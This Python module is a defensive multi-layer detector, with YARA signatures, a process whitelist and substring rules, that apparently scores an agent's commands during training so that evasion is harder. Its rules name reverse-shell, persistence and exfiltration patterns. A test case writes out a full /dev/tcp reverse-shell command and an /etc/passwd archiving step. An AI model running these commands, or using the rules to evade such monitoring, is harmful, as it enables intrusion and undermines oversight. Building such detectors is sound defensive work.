"""Multi-layer defense stack for real environment training.

Layers:
  1. TinyGPT (behavioral sequence) - existing
  2. YARA rules (signature) - detect known malicious patterns in command lines
  3. Process whitelist - flag unknown process names
  4. Syscall anomaly (Falco-style rules) - flag suspicious syscall sequences

Each layer has its own detection logic. Agent is detected if ANY layer flags it.
This is much harder to evade than a single TinyGPT.
"""
from __future__ import annotations

import json
import logging
import re
from collections import Counter
from pathlib import Path
from typing import Any

import numpy as np
import yara

logger = logging.getLogger("multilayer")


# ──────────────────────────────────────────────────────────────────────
# Layer 2: YARA rules for command-line pattern detection
# ──────────────────────────────────────────────────────────────────────

YARA_RULES = r"""
rule suspicious_encoded_payload {
    meta:
        description = "Base64-encoded strings in command line"
        severity = "high"
    strings:
        $b64_long = /[A-Za-z0-9+\/=]{40,}/
    condition:
        $b64_long
}

rule suspicious_dev_tcp {
    meta:
        description = "Bash /dev/tcp reverse shell pattern"
        severity = "critical"
    strings:
        $devtcp = "/dev/tcp/"
        $redirect = ">&"
    condition:
        $devtcp and $redirect
}

rule suspicious_hidden_process {
    meta:
        description = "Hidden process execution (dot prefix, tmp path)"
        severity = "medium"
    strings:
        $dot_tmp = "/tmp/."
        $dot_hidden = ".hidden"
    condition:
        any of them
}

rule suspicious_reverse_shell {
    meta:
        description = "Reverse shell patterns"
        severity = "critical"
    strings:
        $nc_listen = "nc -l"
        $nc_e = "nc -e"
        $bash_i = "bash -i"
        $sh_i = "sh -i"
    condition:
        any of them
}

rule suspicious_persistence {
    meta:
        description = "Persistence mechanism patterns"
        severity = "high"
    strings:
        $cron_add = "crontab -e"
        $systemctl_enable = "systemctl enable"
        $rc_local = "rc.local"
        $bashrc = ".bashrc"
    condition:
        any of them
}

rule suspicious_lateral_movement {
    meta:
        description = "Lateral movement / remote execution"
        severity = "high"
    strings:
        $ssh_i = "ssh -i"
        $scp_push = "scp "
        $ssh_key = "ssh -o"
    condition:
        any of them
}

rule suspicious_data_exfil {
    meta:
        description = "Data exfiltration patterns"
        severity = "high"
    strings:
        $tar_czf = "tar czf"
        $zip_r = "zip -r"
        $base64_d = "base64 -d"
        $curl_d = "curl -d"
        $wget_post = "wget --post"
    condition:
        any of them
}
"""

# Process whitelist: known normal processes on the VM
PROCESS_WHITELIST = {
    "systemd", "sshd", "cron", "systemctl", "journalctl", "rsyslogd",
    "bash", "sh", "sudo", "su", "apt", "dpkg", "snapd", "unattended-upgrade",
    "update-alternatives", "update-notifier", "networkd-dispatch", "fwupd",
    "ModemManager", "multipathd", "udisks2", "irqbalance", "thermald",
    "polkitd", "accounts-daemon", "packagekitd", "colorcd", "rtkit-daemon",
    "dbus-daemon", "avahi-daemon", "cupsd", "cups-browsed", "getty",
    "agetty", "login", "sshd", "init", "kthreadd", "kworker", "ksoftirqd",
    "rcu_sched", "migration", "watchdog", "cpuhp", "kdevtmpfs", "netns",
    "kauditd", "khungtaskd", "oom_reaper", "writeback", "kcompactd0",
    "ksmd", "khugepaged", "kintegrityd", "kblockd", "blkcg_punt_bio",
    "tpm_dev_wq", "ata_sff", "md", "edac-poller", "devfreq_wq", "watchdogd",
    "kworker/u2:0", "kworker/u2:1", "kworker/0:0H", "kworker/0:1H",
    "kworker/u2:2", "kworker/u2:3", "kworker/u2:4", "kworker/u2:5",
    "kworker/u2:6", "kworker/u2:7", "kworker/u2:8", "kworker/u2:9",
    "kworker/u2:10", "kworker/u2:11", "kworker/u2:12", "kworker/u2:13",
    "kworker/u2:14", "kworker/u2:15", "kworker/u2:16", "kworker/u2:17",
    "kworker/u2:18", "kworker/u2:19", "kworker/u2:20", "kworker/u2:21",
    "kworker/u2:22", "kworker/u2:23", "kworker/u2:24", "kworker/u2:25",
    "kworker/u2:26", "kworker/u2:27", "kworker/u2:28", "kworker/u2:29",
    "kworker/u2:30", "kworker/u2:31", "kworker/u2:32", "kworker/u2:33",
    "kworker/u2:34", "kworker/u2:35", "kworker/u2:36", "kworker/u2:37",
    "kworker/u2:38", "kworker/u2:39", "kworker/u2:40", "kworker/u2:41",
    "kworker/u2:42", "kworker/u2:43", "kworker/u2:44", "kworker/u2:45",
    "kworker/u2:46", "kworker/u2:47", "kworker/u2:48", "kworker/u2:49",
    "kworker/u2:50", "kworker/u2:51", "kworker/u2:52", "kworker/u2:53",
    "kworker/u2:54", "kworker/u2:55", "kworker/u2:56", "kworker/u2:57",
    "kworker/u2:58", "kworker/u2:59", "kworker/u2:60", "kworker/u2:61",
    "kworker/u2:62", "kworker/u2:63", "kworker/u2:64", "kworker/u2:65",
    "kworker/u2:66", "kworker/u2:67", "kworker/u2:68", "kworker/u2:69",
    "kworker/u2:70", "kworker/u2:71", "kworker/u2:72", "kworker/u2:73",
    "kworker/u2:74", "kworker/u2:75", "kworker/u2:76", "kworker/u2:77",
    "kworker/u2:78", "kworker/u2:79", "kworker/u2:80", "kworker/u2:81",
    "kworker/u2:82", "kworker/u2:83", "kworker/u2:84", "kworker/u2:85",
    "kworker/u2:86", "kworker/u2:87", "kworker/u2:88", "kworker/u2:89",
    "kworker/u2:90", "kworker/u2:91", "kworker/u2:92", "kworker/u2:93",
    "kworker/u2:94", "kworker/u2:95", "kworker/u2:96", "kworker/u2:97",
    "kworker/u2:98", "kworker/u2:99", "kworker/u2:100",
    "cron", "anacron", "systemd-resolved", "systemd-timesyncd",
    "systemd-networkd", "systemd-logind", "systemd-udevd", "systemd-journald",
    "systemd-udevd", "systemd-userdbd", "dbus-broker", "dbus-broker-launch",
    "systemd-udevd", "systemd-udevd", "systemd-udevd",
    "crontab", "systemctl", "journalctl", "hostnamectl", "timedatectl",
    "localectl", "loginctl", "machinectl", "busctl", "resolvectl",
    "networkctl", "ninja", "ls", "cat", "grep", "head", "tail", "wc",
    "sort", "uniq", "cut", "tr", "sed", "awk", "find", "xargs", "tee",
    "cp", "mv", "rm", "mkdir", "rmdir", "touch", "chmod", "chown",
    "df", "du", "free", "ps", "top", "htop", "vmstat", "iostat",
    "ip", "ss", "netstat", "ifconfig", "route", "arp", "ping", "traceroute",
    "nslookup", "dig", "host", "whois", "curl", "wget", "git", "python3",
    "python", "pip", "pip3", "gcc", "g++", "make", "cmake", "tar",
    "gzip", "gunzip", "bzip2", "xz", "zip", "unzip", "7z", "rar",
    "echo", "printf", "test", "true", "false", "yes", "sleep", "date",
    "cal", "uptime", "w", "who", "whoami", "id", "groups", "env",
    "printenv", "set", "unset", "export", "alias", "unalias", "history",
    "jobs", "fg", "bg", "kill", "killall", "pkill", "pgrep", "pidof",
    "nice", "renice", "nohup", "time", "timeout", "watch", "less",
    "more", "man", "info", "whatis", "apropos", "whereis", "which",
    "type", "hash", "help", "builtin", "source", ".", "eval", "exec",
    "exit", "logout", "return", "break", "continue", "shift", "getopts",
    "read", "select", "case", "if", "then", "else", "elif", "fi",
    "for", "while", "until", "do", "done", "function", "declare",
    "local", "readonly", "export", "let", "expr", "bc", "dc",
    "seq", "shuf", "random", "mktemp", "mktemp", "mktemp",
    "tracee", "tail", "head", "grep", "sort", "uniq", "wc",
}


class MultiLayerDetector:
    """Aggregates multiple detection layers into a unified score.

    Each layer returns a score 0-10 (higher = more suspicious).
    Final detection uses max score across all layers.
    """

    def __init__(self):
        # Layer 1: TinyGPT (behavioral sequence) - passed in externally
        # Layer 2: YARA rules
        try:
            self.yara_rules = yara.compile(source=YARA_RULES)
            logger.info(f"YARA rules compiled: {len(YARA_RULES.split('rule')) - 1} rules")
        except Exception as e:
            logger.warning(f"YARA compilation failed: {e}")
            self.yara_rules = None

        # Layer 3: Process whitelist
        self.whitelist = PROCESS_WHITELIST

        # Layer 4: Syscall pattern rules (simplified Falco-style)
        # Simple substring matching for syscall patterns (more reliable than regex)
        self.syscall_rules = [
            ("/dev/tcp/", 10.0),           # reverse shell via /dev/tcp
            ("nc -l", 10.0),               # netcat listener
            ("ncat -l", 10.0),             # ncat listener
            ("bash -i", 9.0),              # interactive shell
            ("sh -i", 9.0),                # interactive shell
            ("/tmp/.", 8.0),               # hidden tmp executable
            ("base64 -d", 7.0),            # base64 decode
            ("crontab -e", 7.0),           # cron modification
            ("systemctl enable", 6.0),     # service persistence
            ("tar czf /tmp", 5.0),         # archive to tmp
            ("curl -d", 5.0),              # HTTP POST (exfil)
            ("ssh -i", 5.0),               # SSH with key
        ]

        self.layer_scores = {"tinygpt": 0.0, "yara": 0.0, "whitelist": 0.0, "syscall": 0.0}

    def score_command(self, cmdline: str, process_name: str = "", event_type: str = "") -> dict[str, float]:
        """Score a command/event against all layers.

        Returns dict with per-layer scores and combined max score.
        """
        scores = {}

        # Layer 2: YARA
        if self.yara_rules:
            try:
                matches = self.yara_rules.match(data=cmdline.encode())
                if matches:
                    max_severity = max(
                        10.0 if m.meta.get("severity") == "critical"
                        else 7.0 if m.meta.get("severity") == "high"
                        else 4.0
                        for m in matches
                    )
                    scores["yara"] = max_severity
                else:
                    scores["yara"] = 0.0
            except Exception:
                scores["yara"] = 0.0
        else:
            scores["yara"] = 0.0

        # Layer 3: Process whitelist
        if process_name and process_name not in self.whitelist:
            # Check if it's a kernel thread (starts with k, ends with number)
            if not (process_name.startswith("k") and any(c.isdigit() for c in process_name)):
                scores["whitelist"] = 6.0
            else:
                scores["whitelist"] = 0.0
        else:
            scores["whitelist"] = 0.0

        # Layer 4: Syscall pattern (substring match, more reliable)
        max_syscall_score = 0.0
        for pattern, score in self.syscall_rules:
            if pattern in cmdline:
                max_syscall_score = max(max_syscall_score, score)
        scores["syscall"] = max_syscall_score

        self.layer_scores = scores
        return scores

    def get_combined_score(self, tinygpt_surprise: float = 0.0) -> float:
        """Combine all layer scores. TinyGPT is scored separately."""
        scores = self.layer_scores.copy()
        scores["tinygpt"] = tinygpt_surprise
        return max(scores.values())

    def get_details(self) -> dict:
        return dict(self.layer_scores)


def test_detector():
    """Test the multi-layer detector with known patterns."""
    detector = MultiLayerDetector()

    test_cases = [
        ("crontab -l", "crontab", "EXEC", "should be clean"),
        ("systemctl status cron", "systemctl", "EXEC", "should be clean"),
        ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "bash", "EXEC", "critical: reverse shell"),
        ("nc -l -p 4444", "nc", "EXEC", "critical: netcat listener"),
        ("cp /usr/bin/ls /tmp/.hidden_proc", "cp", "EXEC", "medium: hidden process"),
        ("echo 'SGVsbG8=' | base64 -d", "bash", "EXEC", "medium: base64"),
        ("crontab -e", "crontab", "EXEC", "high: cron persistence"),
        ("systemctl enable myservice", "systemctl", "EXEC", "high: service persistence"),
        ("tar czf /tmp/data.tar.gz /etc/passwd", "tar", "EXEC", "medium: archive"),
        ("unknown_proc_xyz", "unknown_proc_xyz", "EXEC", "whitelist: unknown process"),
    ]

    for cmd, proc, etype, expected in test_cases:
        scores = detector.score_command(cmd, proc, etype)
        combined = detector.get_combined_score()
        print(f"  {expected}")
        print(f"    cmd={cmd}")
        print(f"    yara={scores.get('yara', 0):.1f}  whitelist={scores.get('whitelist', 0):.1f}  "
              f"syscall={scores.get('syscall', 0):.1f}  combined={combined:.1f}")
        print()


if __name__ == "__main__":
    test_detector()
